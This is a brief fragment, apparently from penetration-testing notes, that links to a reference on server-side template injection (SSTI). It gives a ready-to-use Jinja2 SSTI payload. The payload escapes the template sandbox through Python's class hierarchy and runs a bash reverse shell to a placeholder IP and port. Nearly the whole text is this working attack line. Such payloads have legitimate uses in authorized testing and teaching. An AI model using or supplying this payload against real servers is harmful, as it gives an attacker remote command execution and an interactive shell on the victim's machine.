...
## For more info regarding SSTI check this out : https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
...
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read()}}
